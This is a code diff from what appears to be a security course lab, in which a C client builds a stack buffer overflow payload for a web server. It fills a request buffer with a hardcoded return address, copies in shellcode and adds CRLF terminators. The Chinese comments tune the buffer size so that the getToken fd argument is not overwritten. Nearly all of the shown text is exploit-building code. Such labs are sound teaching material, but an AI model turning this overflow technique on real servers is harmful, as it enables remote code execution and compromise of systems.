@@ -53,15 +53,24 @@ int main(int argc, char *argv[])
 
   //code fill in it
 	char *req="GET / HTTP/1.1\r\n\r\n";
-  char uri[1049];//uri不能太大，否则会把是getToken的参数fd也覆盖掉，这样getchar就读不到fd程序在getchar内终止
+  char uri[1041];//uri不能太大，否则会把是getToken的参数fd也覆盖掉，这样getchar就读不到fd程序在getchar内终止
 	/*先把返回地址写到字符数组*/
-  int *addr,i;
-  addr=(int)uri;
-  for(i=0;i<262;i++)
-         addr[i]=0xbffff9fc;
+  int *addr_s;
+  int i;
+  addr_s=(int *)uri;
+  for(i=0;i<260;i++)
+         addr_s[i]=0xbffff9fc;
   for(i=0;i<strlen(shellcode);i++)
            uri[i]=shellcode[i];
-      uri[1048]='\0';
+      uri[1040]='\0';
+       uri[1039]='\n';
+       uri[1038]='\r';
+       uri[1037]='\n';
+       uri[1036]='\r';
+ 
+ 
+ 
+ 
   /*
     below show that client send a normal request to the web server
     you should fix the code to realize your attack
